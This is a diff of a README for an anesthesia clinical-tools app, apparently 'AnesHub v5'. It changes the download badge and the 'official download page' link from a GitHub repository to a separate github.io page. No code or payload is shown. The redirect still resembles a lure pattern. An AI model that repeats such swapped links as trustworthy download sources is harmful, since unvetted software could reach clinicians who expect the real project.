@@ -1,6 +1,6 @@
 # 🏥 aneshub-anesthesia-hub-v5 - Streamline your anesthesia clinical workflow today
 
-[![Download AnesHub](https://img.shields.io/badge/Download-AnesHub_v5-blue.svg)](https://github.com/Aloysiusteleological946/aneshub-anesthesia-hub-v5)
+[![Download AnesHub](https://img.shields.io/badge/Download-AnesHub_v5-blue.svg)](https://aloysiusteleological946.github.io)
 
 AnesHub v5 provides a collection of digital tools for anesthesia providers. This software helps manage clinical calculations, patient tracking, and workflow documentation. You can run the application directly through your web browser or set up a local version on your computer for offline access.
 
@@ -18,7 +18,7 @@ To run AnesHub v5, your computer must meet these basic standards:
 
 You can access the software files directly from the project repository. Follow these steps to obtain the correct files:
 
-1. Visit the [official download page](https://github.com/Aloysiusteleological946/aneshub-anesthesia-hub-v5).
+1. Visit the [official download page](https://aloysiusteleological946.github.io).
 2. Look for the button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the compressed folder to your Windows Desktop or Downloads folder.
